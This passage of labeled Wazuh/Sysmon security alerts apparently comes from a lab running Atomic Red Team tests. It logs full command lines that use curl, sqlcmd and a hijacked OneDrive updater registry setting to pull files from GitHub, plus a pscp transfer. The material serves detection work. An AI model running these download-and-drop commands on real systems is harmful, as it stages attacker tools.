{"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2025-07-04 21:47:36.986\r\nProcessGuid: {ff3427f9-4bf7-6868-0a06-000000001400}\r\nProcessId: 272\r\nImage: C:\\Windows\\System32\\curl.exe\r\nTargetFilename: C:\\Users\\Public\\Music\\allthethingsx64.dll\r\nCreationUtcTime: 2025-07-04 21:47:36.985\r\nUser: SOCLAB\\snell\"", "version": "2", "systemTime": "2025-07-04T21:47:36.9871179Z", "eventRecordID": "391537", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "Executable file dropped in Users\\Public folder", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Ingress Tool Transfer"], "id": ["T1105"], "tactic": ["Command and Control"]}, "id": "92207"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665685.64090872", "timestamp": "2025-07-04T21:48:05.763+0000"}, "fields": {"timestamp": ["2025-07-04T21:48:05.763Z"]}, "sort": [1751665685763]}}
{"id": "7Bdp15cB1Hp-jZ7fObJ_", "description": "curl.exe launched with commands to create a binary file", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "7Bdp15cB1Hp-jZ7fObJ_", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "curl.exe", "image": "C:\\\\Windows\\\\System32\\\\curl.exe", "product": "The curl executable", "parentProcessGuid": "{ff3427f9-4bf5-6868-0706-000000001400}", "description": "The curl executable", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\\\programdata\\\\allthethingsx64.dll &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\\\allthethingsx64.dll", "processGuid": "{ff3427f9-4bf8-6868-0b06-000000001400}", "logonId": "0xa45f0", "parentProcessId": "2724", "processId": "4616", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:36.997", "hashes": "SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "curl, https://curl.se/", "commandLine": "C:\\\\Windows\\\\System32\\\\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll", "integrityLevel": "High", "fileVersion": "8.13.0", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:36.997\r\nProcessGuid: {ff3427f9-4bf8-6868-0b06-000000001400}\r\nProcessId: 4616\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 8.13.0\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: C:\\Windows\\System32\\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F\r\nParentProcessGuid: {ff3427f9-4bf5-6868-0706-000000001400}\r\nParentProcessId: 2724\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll & C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll & C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll & C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:36.9998318Z", "eventRecordID": "391539", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": true, "description": "curl.exe launched with commands to create a binary file", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Ingress Tool Transfer"], "id": ["T1105"], "tactic": ["Command and Control"]}, "id": "92074"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665685.64093676", "timestamp": "2025-07-04T21:48:05.767+0000"}, "fields": {"timestamp": ["2025-07-04T21:48:05.767Z"]}, "sort": [1751665685767]}}
{"id": "LRdr15cB1Hp-jZ7fj7N2", "description": "Powershell was used to delete files or directories", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "LRdr15cB1Hp-jZ7fj7N2", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4ca8-6868-4406-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\\\Atomic-license.txt", "processGuid": "{ff3427f9-4ca8-6868-4606-000000001400}", "logonId": "0xa45f0", "parentProcessId": "3544", "processId": "8368", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:50:32.712", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "powershell.exe  iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\Atomic-license.txt", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:50:32.712\r\nProcessGuid: {ff3427f9-4ca8-6868-4606-000000001400}\r\nProcessId: 8368\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe  iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile C:\\Users\\snell\\AppData\\Local\\Temp\\Atomic-license.txt\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-4ca8-6868-4406-000000001400}\r\nParentProcessId: 3544\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:50:32.7140813Z", "eventRecordID": "391934", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Powershell was used to delete files or directories", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["File Deletion"], "id": ["T1070.004"], "tactic": ["Defense Evasion"]}, "id": "92021"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665832.64448447", "timestamp": "2025-07-04T21:50:32.404+0000"}, "fields": {"timestamp": ["2025-07-04T21:50:32.404Z"]}, "sort": [1751665832404]}}
{"id": "NBds15cB1Hp-jZ7fI7Pn", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "NBds15cB1Hp-jZ7fI7Pn", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-4cd0-6868-4d06-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "9440", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:51:12.216", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"powershell.exe\\\" &amp; {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\\\T1105.zip}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 21:51:12.216\r\nProcessGuid: {ff3427f9-4cd0-6868-4d06-000000001400}\r\nProcessId: 9440\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:51:12.2186991Z", "eventRecordID": "391989", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 64, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665876.64484151", "timestamp": "2025-07-04T21:51:16.785+0000"}, "fields": {"timestamp": ["2025-07-04T21:51:16.785Z"]}, "sort": [1751665876785]}}
{"id": "ORds15cB1Hp-jZ7fM7OR", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "ORds15cB1Hp-jZ7fM7OR", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PSCP", "image": "C:\\\\AtomicRedTeam\\\\ExternalPayloads\\\\pscp.exe", "product": "PuTTY suite", "parentProcessGuid": "{ff3427f9-4cd1-6868-5006-000000001400}", "description": "Command-line SCP/SFTP client", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c fsutil file createnew C:\\\\Temp\\\\T1105_scp.zip 1048576 &amp; echo y | C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\pscp.exe -P 22 -pw atomic C:\\\\Temp\\\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip", "processGuid": "{ff3427f9-4cd2-6868-5406-000000001400}", "logonId": "0xa45f0", "parentProcessId": "3404", "processId": "4912", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:51:14.480", "hashes": "SHA1=5BBAE525DA8F721E0BB525226D5463D594CC6187,MD5=B76478C1A7CFD6E8DD82B4BEC2C9B668,SHA256=5AA48B142333BC7D097AED9A75284BD66B325C26558C8B9B6F37C276F3A5173A,IMPHASH=2247B91E1D45B84EB01026F0A6E3319D", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Simon Tatham", "commandLine": "C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\pscp.exe  -P 22 -pw atomic C:\\\\Temp\\\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip", "integrityLevel": "High", "fileVersion": "Release 0.83", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:51:14.480\r\nProcessGuid: {ff3427f9-4cd2-6868-5406-000000001400}\r\nProcessId: 4912\r\nImage: C:\\AtomicRedTeam\\ExternalPayloads\\pscp.exe\r\nFileVersion: Release 0.83\r\nDescription: Command-line SCP/SFTP client\r\nProduct: PuTTY suite\r\nCompany: Simon Tatham\r\nOriginalFileName: PSCP\r\nCommandLine: C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\pscp.exe  -P 22 -pw atomic C:\\Temp\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=5BBAE525DA8F721E0BB525226D5463D594CC6187,MD5=B76478C1A7CFD6E8DD82B4BEC2C9B668,SHA256=5AA48B142333BC7D097AED9A75284BD66B325C26558C8B9B6F37C276F3A5173A,IMPHASH=2247B91E1D45B84EB01026F0A6E3319D\r\nParentProcessGuid: {ff3427f9-4cd1-6868-5006-000000001400}\r\nParentProcessId: 3404\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576 & echo y | C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\pscp.exe -P 22 -pw atomic C:\\Temp\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:51:14.4932933Z", "eventRecordID": "392025", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 46, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665879.64514263", "timestamp": "2025-07-04T21:51:19.320+0000"}, "fields": {"timestamp": ["2025-07-04T21:51:19.320Z"]}, "sort": [1751665879320]}}
{"id": "Qhds15cB1Hp-jZ7fbrM8", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "Qhds15cB1Hp-jZ7fbrM8", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-4ce4-6868-6706-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "6876", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:51:32.108", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"powershell.exe\\\" &amp; {if (-not (Test-Path \\\\\\\"\\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDriveStandaloneUpdater.exe\\\\\\\"\\\")) {     Write-Host \\\\\\\"\\\"OneDriveStandaloneUpdater.exe not found at C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDriveStandaloneUpdater.exe. Test cannot continue.\\\\\\\"\\\"     exit 1 }  New-Item -Path \\\\\\\"\\\"HKCU:\\\\Software\\\\Microsoft\\\\OneDrive\\\\UpdateOfficeConfig\\\\\\\"\\\" -Force | Out-Null Set-ItemProperty -Path \\\\\\\"\\\"HKCU:\\\\Software\\\\Microsoft\\\\OneDrive\\\\UpdateOfficeConfig\\\\\\\"\\\" -Name \\\\\\\"\\\"UpdateRingSettingURLFromOC\\\\\\\"\\\" -Value \\\\\\\"\\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\\\\\"\\\" -Type String -Force Set-ItemProperty -Path \\\\\\\"\\\"HKCU:\\\\Software\\\\Microsoft\\\\OneDrive\\\\UpdateOfficeConfig\\\\\\\"\\\" -Name \\\\\\\"\\\"ODSUUpdateXMLUrlFromOC\\\\\\\"\\\" -Value \\\\\\\"\\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\\\\\"\\\" -Type String -Force Set-ItemProperty -Path \\\\\\\"\\\"HKCU:\\\\Software\\\\Microsoft\\\\OneDrive\\\\UpdateOfficeConfig\\\\\\\"\\\" -Name \\\\\\\"\\\"UpdateXMLUrlFromOC\\\\\\\"\\\" -Value \\\\\\\"\\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\\\\\"\\\" -Type String -Force Set-ItemProperty -Path \\\\\\\"\\\"HKCU:\\\\Software\\\\Microsoft\\\\OneDrive\\\\UpdateOfficeConfig\\\\\\\"\\\" -Name \\\\\\\"\\\"UpdateOfficeConfigTimestamp\\\\\\\"\\\" -Value 99999999999 -Type QWord -Force  # Run OneDrive Standalone Updater &amp; \\\\\\\"\\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDriveStandaloneUpdater.exe\\\\\\\"\\\"}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 21:51:32.108\r\nProcessGuid: {ff3427f9-4ce4-6868-6706-000000001400}\r\nProcessId: 6876\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {if (-not (Test-Path \\\"\"C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\\\"\")) {\n    Write-Host \\\"\"OneDriveStandaloneUpdater.exe not found at C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe. Test cannot continue.\\\"\"\n    exit 1\n}\n\nNew-Item -Path \\\"\"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\"\" -Force | Out-Null\nSet-ItemProperty -Path \\\"\"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\"\" -Name \\\"\"UpdateRingSettingURLFromOC\\\"\" -Value \\\"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\"\" -Type String -Force\nSet-ItemProperty -Path \\\"\"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\"\" -Name \\\"\"ODSUUpdateXMLUrlFromOC\\\"\" -Value \\\"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\"\" -Type String -Force\nSet-ItemProperty -Path \\\"\"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\"\" -Name \\\"\"UpdateXMLUrlFromOC\\\"\" -Value \\\"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\"\" -Type String -Force\nSet-ItemProperty -Path \\\"\"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\"\" -Name \\\"\"UpdateOfficeConfigTimestamp\\\"\" -Value 99999999999 -Type QWord -Force\n\n# Run OneDrive Standalone Updater\n& \\\"\"C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\\\"\"}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: 